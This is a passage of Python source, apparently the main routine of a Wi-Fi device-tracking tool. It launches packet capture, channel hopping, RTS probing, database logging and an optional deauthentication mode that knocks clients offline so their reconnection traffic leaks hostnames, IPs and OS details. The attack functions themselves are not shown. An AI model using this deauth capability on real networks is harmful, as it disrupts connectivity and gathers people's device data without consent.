        alias = {"computers": "computer", "pc": "computer", "pcs": "computer",
                 "laptop": "computer", "laptops": "computer",
                 "phones": "phone", "mobile": "phone", "android": "phone",
                 "iots": "iot", "smart": "iot"}
        args.only = alias.get(args.only.lower().strip(), args.only.lower().strip())
        if args.only not in ("computer", "phone", "iot"):
            print(f"error: --only must be computer/phone/iot (got '{args.only}')",
                  file=sys.stderr)
            return 2
    if args.top is None:
        args.top = 10 if args.ssid else 30
    if args.ssid and not args.channel and not args.hop:
        args.hop = True
    # a specific band request means "sweep that band" -> imply hopping
    if args.band in ("5", "2.4") and not args.channel and not args.hop:
        args.hop = True
    # naming the joined interface is enough to want active resolution
    if args.enrich_iface:
        args.enrich_local = True

    oui = OuiResolver()
    if args.oui_file:
        try:
            n = oui.load_file(args.oui_file)
            print(f"loaded {n} OUI entries from {args.oui_file}")
        except Exception as e:
            print(f"warning: could not load OUI file: {e}", file=sys.stderr)

    tracker = Tracker(alpha=args.alpha, rank_by=args.rank_by,
                      window_s=args.window, min_samples=args.min_samples,
                      half_life=args.half_life)
    stop_event = threading.Event()

    if args.ssid:
        _orig_snapshot = tracker.snapshot
        wanted = args.ssid

        def _filtered(**kw):
            rows = _orig_snapshot(**kw)
            targets = tracker.bssids_for_ssid(wanted)
            if not targets:
                return []
            return [s for s in rows if s.bssid in targets]
        tracker.snapshot = _filtered

    def _stop(*_):
        stop_event.set()
    signal.signal(signal.SIGINT, _stop)
    signal.signal(signal.SIGTERM, _stop)

    threads = []
    for ifc in args.ifaces:
        cap = threading.Thread(target=run_capture,
                               args=(tracker, ifc, oui, stop_event, args),
                               daemon=True)
        cap.start()
        threads.append(cap)

    if args.hop_channels:
        chans = [int(c) for c in args.hop_channels.split(",") if c.strip()]
    else:
        chans = band_channels(args.band, args.include_dfs)

    def _start_hopper(ifc, lock):
        h = threading.Thread(
            target=channel_hopper,
            args=(ifc, chans, stop_event),
            kwargs={"dwell": args.dwell, "tracker": tracker, "ssid": args.ssid,
                    "lock_strongest": lock, "lock_after": args.lock_after,
                    "force_width": args.width},
            daemon=True)
        h.start()
        threads.append(h)

    if args.channel and not args.hop:
        # derive the VHT center (80/160) or HT40 offset so a fixed 5 GHz
        # channel actually opens at the requested width â€” not silent 20 MHz.
        cc = center_channel(args.channel, args.width) if args.width else None
        off = ht40_offset(args.channel) if args.width == 40 else None
        for ifc in args.ifaces:
            _set_channel(ifc, args.channel, args.width, cc, off)
    elif args.lock_strongest and len(args.ifaces) > 1:
        _start_hopper(args.ifaces[0], True)
        for ifc in args.ifaces[1:]:
            _start_hopper(ifc, False)
    elif args.hop:
        for ifc in args.ifaces:
            _start_hopper(ifc, args.lock_strongest)
    elif args.lock_strongest:
        _start_hopper(args.ifaces[0], True)

    if args.ping_clients:
        src_mac = normalize_mac(args.ping_src) if args.ping_src else random_laa_mac()
        print("\n" + "!" * 66)
        print("  ACTIVE PROBING ENABLED (--ping-clients): injecting RTS frames")
        print("  to elicit CTS replies. This is a liveness/ranging probe, NOT a")
        print("  deauth â€” it does not disconnect devices. Use ONLY on networks")
        print(f"  and devices you are authorized to test. RTS source: {src_mac}")
        print("!" * 66 + "\n")
        time.sleep(1.5)
        png = threading.Thread(target=client_pinger,
                               args=(tracker, args.ifaces[0], stop_event, args,
                                     src_mac), daemon=True)
        png.start()
        threads.append(png)

    if args.deauth:
        # Dual-adapter: ifaces[0] captures, ifaces[-1] injects (when 2+).
        # Single adapter: same interface does both.
        if len(args.ifaces) >= 2:
            inject_iface = args.ifaces[-1]
            capture_iface = args.ifaces[0]
            mode_desc = f"dual-adapter: capture={capture_iface} inject={inject_iface}"
        else:
            inject_iface = None   # fallback: inject on capture iface
            capture_iface = args.ifaces[0]
            mode_desc = f"single-adapter: {capture_iface} (capture+inject)"
        smart_desc = " smart=ON (only un-enriched)" if args.deauth_smart else ""
        print("\n" + "!" * 66)
        print("  DEAUTH ENABLED (--deauth): sending deauthentication frames to")
        print("  force client reassociation. This WILL temporarily disconnect")
        print("  devices. Reassociating clients leak DHCP, ARP, mDNS, and")
        print("  probe-request data (hostname / IP / OS / model).")
        print("  Use ONLY on networks and devices you are authorized to test.")
        print(f"  Mode: {mode_desc}")
        print(f"  Interval: {args.deauth_interval}s  Count: {args.deauth_count}  "
              f"Max: {args.deauth_max}  Cooldown: {args.deauth_cooldown}s"
              f"{smart_desc}")
        print("!" * 66 + "\n")
        time.sleep(2.0)
        dea = threading.Thread(target=client_deauther,
                               args=(tracker, capture_iface, stop_event, args,
                                     inject_iface),
                               daemon=True)
        dea.start()
        threads.append(dea)

    if args.enrich_local:
        via = args.enrich_iface or "auto (default route)"
        sweep = "on" if args.arp_scan else "off"
        print(f"[*] active L3 enrichment: resolving hostname/IP via {via} "
              f"(ARP sweep {sweep} Â· mDNS/NetBIOS/rDNS).")
        enr = threading.Thread(target=local_enricher,
                               args=(tracker, stop_event, args), daemon=True)
        enr.start()
        threads.append(enr)

    db = None
    if args.db:
        try:
            db = DeviceDB(args.db, history=args.db_history)
            print(f"[*] logging devices to SQLite: {args.db}"
                  + (" (+history)" if args.db_history else ""))
            dbt = threading.Thread(target=db_writer,
                                   args=(db, tracker, oui, args, stop_event),
                                   daemon=True)
            dbt.start()
            threads.append(dbt)
        except Exception as e:
            print(f"warning: could not open DB {args.db}: {e}", file=sys.stderr)
            db = None

    use_rich = not args.no_rich
    if use_rich:
        try:
            import rich  # noqa
        except Exception:
            use_rich = False

    try:
        if use_rich:
            run_ui_rich(tracker, oui, args, stop_event)
        else:
            run_ui_plain(tracker, oui, args, stop_event)
    finally:
        stop_event.set()
        time.sleep(0.2)
        if db is not None:
            try:
                n = db.flush(tracker, oui, args)
                db.close()
                print(f"saved {n} devices to {args.db}")
            except Exception as e:
                print("could not finalize DB:", e, file=sys.stderr)
        if args.output:
            try:
                export_report(tracker, oui, args)
            except Exception as e:
                print("could not write report:", e, file=sys.stderr)

    if tracker.errors:
        print("\n" + "=" * 60, file=sys.stderr)
        for msg in tracker.errors:
            print("CAPTURE STOPPED: " + msg, file=sys.stderr)
        print("=" * 60, file=sys.stderr)
        return 1
    return 0


if __name__ == "__main__":
    sys.exit(main())
